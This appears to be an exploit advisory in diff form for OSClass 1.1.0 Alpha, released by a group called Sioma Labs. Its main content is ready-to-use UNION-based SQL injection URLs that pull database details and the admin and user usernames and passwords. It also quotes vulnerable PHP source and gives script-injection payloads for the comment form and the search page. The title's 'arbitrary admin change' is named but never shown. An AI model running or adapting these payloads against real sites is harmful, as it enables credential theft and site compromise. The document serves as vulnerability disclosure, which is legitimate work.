@@ -1,0 +1,68 @@
+ __ _                           __       _         
+/ _(_) ___  _ __ ___   __ _    / /  __ _| |__  ___ 
+\ \| |/ _ \| '_ ` _ \ / _` |  / /  / _` | '_ \/ __|
+_\ \ | (_) | | | | | | (_| | / /___ (_| | |_) \__ \
+\__/_|\___/|_| |_| |_|\__,_| \____/\__,_|_.__/|___/
+========================================================================================
+Open Source Classifieds (OSClassi) SQLi/Xss/Arbitrary Admin Change Multi Vulnerabilities
+----------------------------------------------------------------------------------------
+- Site 		: http://osclass.org/                                                   
+- Download  : http://sourceforge.net/projects/osclass/files/
+- Author 	: Sioma Labs
+- Version 	: 1.1.0 Alpha
+- Tested on : WIndows XP SP2 (WAMP)
+
+[-------------------------------------------------------------------------------------------------------------------------]
+
+MYSQL Injection 
+===============
+POC
+http://server/item.php?id=[SQLi]
+
+Basic Info
+http://server/item.php?id=-1 UNION SELECT 1,2,3,4,5,6,concat_ws(CHAR(32,58,32),user(),database(),version())--
+
+Admin ID,Username,Password
+http://server/item.php?id=-1 UNION SELECT 1,2,3,4,5,6,group_concat(id,0x3a,username,0x3a,password)+from oc_admin--
+
+User ID,UserName,Password
+http://server/item.php?id=-1 UNION SELECT 1,2,3,4,5,6,group_concat(id,0x3a,username,0x3a,password)+from+oc_user--
+
+[-------------------------------------------------------------------------------------------------------------------------]
+Cross Site Scripting
+====================
+
+Xss Source Review (item.php)
+------------------------------
+
+1st Xss item.php 
+[+]  To Work This You need to Have A iteam already posted (http://server/item.php?action=post)
+------------------------------
+	case 'add_comment':
+		dbExec("INSERT INTO %sitem_comment (item_id, author_name, author_email, body) VALUES (%d, '%s', '%s', '%s')", 
+			DB_TABLE_PREFIX, $_POST['id'], $_POST['authorName'], $_POST['authorEmail'], $_POST['body']);
+		header('Location: item.php?id=' . $_POST['id']);
+		break;
+	case 'post':
+------------------------------
+
+[+] Put This c0de in to the comment box
+"><script>alert(String.fromCharCode(88, 83, 83));</script>
+
+-------------------------------
+
+2nd Xss (search.php)
+---------------------------------
+$pattern = $_GET['pattern'];
+--------------------------------
+
+POC
+http://server/search.php?pattern=[Xss]
+Exploit
+http://server/search.php?pattern=<script>alert(String.fromCharCode(88, 83, 83));</script>
+
+[-------------------------------------------------------------------------------------------------------------------------]
+
+[-------------------------------------------------------------------------------------------------------------------------]
+# http://siomalabs.com [Sioma Labs]
+# Sioma Agent 154
